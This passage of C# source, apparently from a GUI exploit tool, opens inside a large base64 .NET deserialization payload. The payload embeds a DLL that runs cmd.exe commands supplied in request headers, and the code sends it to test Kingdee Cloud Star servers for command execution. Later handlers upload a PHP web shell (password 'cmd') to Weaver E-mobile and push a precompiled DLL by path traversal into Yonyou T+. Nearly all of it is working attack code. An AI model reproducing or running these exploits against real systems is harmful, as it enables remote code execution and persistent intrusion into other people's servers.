uIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDoQ7dkAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACQJgAASwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABgBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHQCAAAjU3RyaW5ncwAAAACcBAAAJAAAACNVUwDABAAAEAAAACNHVUlEAAAA0AQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA+iUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAK8BIgAGACQCGgIGAEQCGgIGAGkCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKYBPwBZALYBRABBAL0BMABBAMsBSgBBAOYBSgBBAAACSgA5ABQCTwA5ADECUwBpAE8CWAAxAFkCMAAxAF8CCgAxAGUCCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgB0bHNwa2R5NS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB0bHNwa2R5NQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0hlYWRlcnMAZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGF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udW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=\",\"format\":\"3\"}";
                StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                                                                             // ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                                                                             //  byte[] byte1 = encoding.GetBytes(postid);
                                                                             //   req.ContentLength = byte1.Length;
                ss.Write(postid);
                ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                string sss = streamreader.ReadToEnd();
                if (sss == "")
                {
                    richTextBox8.AppendText(sss + "不存在金蝶云星空命令执行漏洞" + Environment.NewLine);

                }




                else if (sss.Length > 0)
                {

                    richTextBox8.AppendText(sss + "[!]存在金蝶云星空命令执行漏洞" + Environment.NewLine);
                }
                {


                }
                {


                }











            }
            catch (Exception ex)
            {



            }
        }

        private async void button18_Click(object sender, EventArgs e)
        {
            var httpClient = new HttpClient();
            var url = textBox_weaverAllCheck.Text + "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save";
            var formData = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes("0x4ddads.php."));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
            formData.Add(fileContent, "upload_quwan", "0x4ddads.php.");
            var response = await httpClient.PostAsync(url, formData);
            response.EnsureSuccessStatusCode();
            String responseBody = await response.Content.ReadAsStringAsync();
            richTextBox_weaverAllCheck.Text = "上传成功" + responseBody + "密码:cmd";
        }

        public async void yz1()
        {
            var httpClient = new HttpClient();
            var url = textBox19.Text + "/tplus/SM/SetupAccount/Upload.aspx?preload=1";
            var formData = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes("App_Web_8.aspx.cdcab7d2.dll"));
            fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg");
            formData.Add(fileContent, "File1", "../../../bin/App_Web_8.aspx.cdcab7d2.dll");
            var response = await httpClient.PostAsync(url, formData);
            response.EnsureSuccessStatusCode();
            String responseBody = await response.Content.ReadAsStringAsync();
            richTextBox10.AppendText("正在上传（二）内置预编译文件...." + Environment.NewLine);

        }

        public async void yz()
        {
            var httpClient = new HttpClient();
